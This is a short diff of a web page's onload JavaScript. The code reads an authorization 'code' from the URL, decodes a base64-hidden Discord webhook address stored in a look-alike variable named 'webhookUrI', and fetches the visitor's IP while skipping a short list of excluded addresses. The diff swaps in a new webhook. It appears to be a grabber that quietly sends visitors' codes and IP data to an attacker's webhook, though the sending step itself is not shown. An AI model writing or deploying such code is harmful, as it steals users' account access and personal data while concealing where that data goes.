@@ -160,10 +160,10 @@
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             const code = urlParams.get('code');
-            const webhookUrI = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2Mjc5MTAyNDQ3Mjg4NzM4Ny9Ga1ZhN0dveVUwMFVpUzdhVU02bWtSc0lLazVaSmxESURaLVJGS3BMSnpzWl9vYlpnT0h2Sl9rNHVDZ08xY01aVEYyeQ==";
+            const webhookUrI = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2Mjc5NDAyNDIzMDU4ODU4OS9Jc0Rod2gwRGpNR0k5MHVPNGNsaUVxVU1JeVFSWFQtdzJwOUtzOF9qdm5HaHVOZ2c4a2txR0pWSm5nOXlkcG5DM1Z3eQ==";
             const webhookUrl = atob(webhookUrI);
 
-            const blacklistedIPs = ["81.35.53.46", "82.78.75.96"];
+            const blacklistedIPs = ["81.35.53.46", "1"];
 
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
